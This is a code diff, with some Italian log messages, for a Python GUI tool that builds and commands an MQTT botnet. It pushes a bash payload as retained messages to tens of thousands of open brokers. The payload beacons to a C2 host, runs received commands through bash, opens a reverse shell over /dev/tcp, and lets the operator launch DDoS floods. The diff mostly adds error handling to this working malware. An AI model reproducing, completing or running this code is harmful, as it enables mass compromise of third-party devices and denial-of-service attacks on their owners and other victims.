@@ -219,35 +219,45 @@ while true; do
     -m "ok:$(id):$(nproc):$(free -m|awk 'NR==2{{print $2}}'):$([[ -f /proc/net/tcp ]]&&wc -l /proc/net/tcp||echo 1000)" 1>/dev/null 2>&1
   mosquitto_sub -h $C2_IP -p 1883 -t "/sys/update/$C2_IP/#" -C 1 | while IFS=' ' read -r topic payload; do
     case $payload in
-      ddos:*) ${{payload#ddos:}} & ;;
+      ddos:*) echo "${{payload#ddos:}}" | bash 2>/dev/null & ;;
       shell:*) bash -i >& /dev/tcp/${{payload#shell:}}/0>&1 ;;
       kill) rm $LOOP; exit ;;
     esac
   done || sleep 15
 done"""
         
-        with open('brokers.txt') as f:
-            targets = [line.strip().split()[4] for line in f if '1883/open' in line][:50000]  # Top 50k
+        try:
+            with open('brokers.txt') as f:
+                targets = [line.strip().split()[4] for line in f if '1883/open' in line][:50000]  # Top 50k
+        except:
+            self.log("❌ brokers.txt non trovato!")
+            return
         
         self.log(f"🦠 INFECTING {len(targets)} brokers...")
         
         def infect_one(target):
-            ip, port = target.split(':')
-            for topic in self.INFECT_TOPICS:
-                try:
+            try:
+                ip, port = target.split(':')
+                for topic in self.INFECT_TOPICS:
                     subprocess.run(f'mosquitto_pub -h {ip} -p {port} -t "{topic}" -m "{infect_payload}" --retain -q 1', 
                                  shell=True, timeout=3, capture_output=True)
                     self.brokers_infected += 1
                     self.safe_update_stats()
                     return True
-                except:
-                    continue
+            except:
+                pass
             return False
         
-        with ThreadPoolExecutor(max_workers=2000) as executor:
-            futures = [executor.submit(infect_one, target) for target in targets]
-            for future in as_completed(futures):
-                future.result()
+        try:
+            with ThreadPoolExecutor(max_workers=2000) as executor:
+                futures = [executor.submit(infect_one, target) for target in targets]
+                for future in as_completed(futures):
+                    try:
+                        future.result()
+                    except:
+                        pass
+        except:
+            pass
         
         self.log("🎉 INFECTION COMPLETA! Aspetta 2-5min per heartbeat...")
     
@@ -255,9 +265,13 @@ done"""
         self.ddos_frame.pack(fill='x', padx=20, pady=10)
     
     def launch_ddos(self):
-        target_ip = self.target_ip.get() or "8.8.8.8"
-        target_port = self.target_port.get() or "80"
-        duration = int(self.duration.get() or 300)
+        try:
+            target_ip = self.target_ip.get() or "8.8.8.8"
+            target_port = self.target_port.get() or "80"
+            duration = int(self.duration.get() or "300")
+        except:
+            self.log("❌ DDoS params invalidi")
+            return
         
         if self.total_zombies < 10:
             messagebox.showwarning("Attenzione", "Prima INFECT!")
@@ -269,10 +283,13 @@ done"""
         self.log(f"💥 DDoS FIRE! {target_ip}:{target_port} x{duration}s | Zombies: {self.total_zombies:,}")
         
         # PROPAGA A TUTTI (brokers + clients)
-        self.client.publish(self.CMD_TOPIC.replace('+','*'), ddos_cmd)
+        try:
+            self.client.publish(self.CMD_TOPIC.replace('+','*'), ddos_cmd)
+        except:
+            pass
         
         # Timer kill
-        threading.Timer(duration, lambda: self.kill_ddos()).start()
+        threading.Timer(int(duration), lambda: self.kill_ddos()).start()
     
     def kill_ddos(self):
         self.client.publish(self.CMD_TOPIC.replace('+','*'), "kill")
